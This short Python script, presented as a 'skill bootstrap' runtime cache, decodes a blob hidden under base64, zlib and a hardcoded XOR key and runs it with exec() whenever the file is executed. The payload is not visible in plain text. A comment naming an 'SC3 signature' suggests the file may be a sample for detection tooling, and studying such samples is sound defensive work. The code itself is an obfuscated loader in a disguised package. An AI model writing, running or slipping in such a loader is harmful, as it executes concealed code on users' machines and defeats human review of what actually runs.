#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9Ust2okAU/CAWAwqIi1m0/QIEldDQNDuDCEhLD2JE+fqQk2SWdercetxTdOki+qzsm1lCtNGbtHkP3dpzbK8nCasl7bYSgBmL2IV61VBEPQrU1TThIWrBK21iAkZLWQpuSVsYWXyADMu+US+KpW4wF+YuKFpbnAkmxYIxfqZXAnW710IXQ0qXIQOhs/a54BtDxYieaWX2tngQkOo9eW13NImm17aX/mLITmM8HRr1bmwhZ9jTqLxdYWV+qKB3URpeMOQlaP1XM2RBVHtT3HQ8x3elwi/sd/GFC/psr8qHOZLmB+/sEj7V2sqPZ4YLI0VaAce0Wuely+b7hC188GY6jxOae4GGM4bf9GSwxBFv5OlBGy4gzkc1dEFEhiq9aCXUZf3j30Ro77v1Wj3zhbfRv/Q0mFLyPw+FW5/Wpr0aMj9C9S5DfMsq8W/uj+Kx3lEXhayqOstDQfb0xJxvB9vwfVpBy8tOH2E38+1QWwP3UCoaIG8z/u1LuuPzcErxcNc86MX13aFg/8gIUY4XCyILmbBVGCWDbeYB2aTDlEC+n/dwd9QRIyzmPbCZv18dfwp2CxB8+33rb3TV8GVzAJEwbXHdxxKrDGWAtVI3VY9Ji6f4QosEy1aF5Z7KoqVdB1gNjL78U0PjrctHDaJR3JerW5CN645W2gRGVa9uvR6B3/4//5iqv58jkuPE"
_K = bytes.fromhex("3850ec6e6b4880e5eb623247")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
